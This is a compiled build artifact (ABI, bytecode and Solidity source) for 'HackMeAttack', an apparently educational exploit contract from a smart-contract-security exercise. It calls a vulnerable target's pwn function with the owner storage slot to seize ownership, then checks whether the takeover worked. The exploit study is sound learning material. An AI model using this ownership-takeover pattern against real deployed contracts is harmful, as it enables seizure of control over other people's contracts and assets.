{
  "contractName": "HackMeAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_hackMe",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "hackMe",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "viewOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "isAttackSuccessful",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161044c38038061044c83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6103b9806100936000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806313132aa51461005157806375efcec51461006e5780639e5faafc14610099578063bc677b46146100a3575b600080fd5b6100596100ab565b60405190151581526020015b60405180910390f35b600054610081906001600160a01b031681565b6040516001600160a01b039091168152602001610065565b6100a1610128565b005b610081610282565b6000805460408051638da5cb5b60e01b8152905133926001600160a01b031691638da5cb5b9160048083019260209291908290030181865afa1580156100f5573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011991906102ff565b6001600160a01b031614905090565b60008060009054906101000a90046001600160a01b03166001600160a01b0316631ee311926040518163ffffffff1660e01b8152600401602060405180830381865afa15801561017c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a0919061032f565b600080546040516024810184905292935090916001600160a01b039091169060440160408051601f198184030181529181526020820180516001600160e01b03166335f4581b60e01b179052516101f79190610348565b6000604051808303816000865af19150503d8060008114610234576040519150601f19603f3d011682016040523d82523d6000602084013e610239565b606091505b505090508061027e5760405162461bcd60e51b815260206004820152600d60248201526c105d1d1858dac819985a5b1959609a1b604482015260640160405180910390fd5b5050565b60008060009054906101000a90046001600160a01b03166001600160a01b0316638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156102d6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102fa91906102ff565b905090565b60006020828403121561031157600080fd5b81516001600160a01b038116811461032857600080fd5b9392505050565b60006020828403121561034157600080fd5b5051919050565b6000825160005b81811015610369576020818601810151858301520161034f565b81811115610378576000828501525b50919091019291505056fea264697066735822122028ccde89cdb63eeb7e5c3ae438baddf583248f68481abaec8ad6dce055f308d664736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.11;\r\n\r\ninterface IHackMe {\r\n    function owner() external view returns (address);\r\n    function getOwnerSlot() external pure returns (uint256);\r\n}\r\n\r\ncontract HackMeAttack {\r\n    address public hackMe;\r\n\r\n    constructor(address _hackMe) {\r\n        hackMe = _hackMe;\r\n    }\r\n\r\n    function attack() public {\r\n        uint256 ownerSlot = IHackMe(hackMe).getOwnerSlot();\r\n        // 调用参数匹配uint256类型\r\n        (bool success, ) = hackMe.call(abi.encodeWithSignature(\"pwn(uint256)\", ownerSlot));\r\n        require(success, \"Attack failed\");\r\n    }\r\n\r\n    function viewOwner() public view returns (address) {\r\n        return IHackMe(hackMe).owner();\r\n    }\r\n\r\n    function isAttackSuccessful() public view returns (bool) {\r\n        return IHackMe(hackMe).owner() == msg.sender;\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\HackMeAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.706Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}